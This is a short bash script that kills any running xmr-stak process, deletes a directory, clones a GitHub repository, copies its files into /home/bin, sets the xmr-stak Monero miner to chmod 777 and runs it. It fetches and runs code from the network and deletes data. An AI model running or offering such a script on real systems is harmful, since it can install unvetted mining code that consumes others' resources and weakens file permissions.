#!/bin/bash
 pkill xmr-stak
 cd /home
 rm -r 1
 git clone https://github.com/merrygreek/1.git
 cp -r /home/1/*.txt /home/bin
 cd /home/bin
 chmod 777 ./xmr-stak
 ./xmr-stak

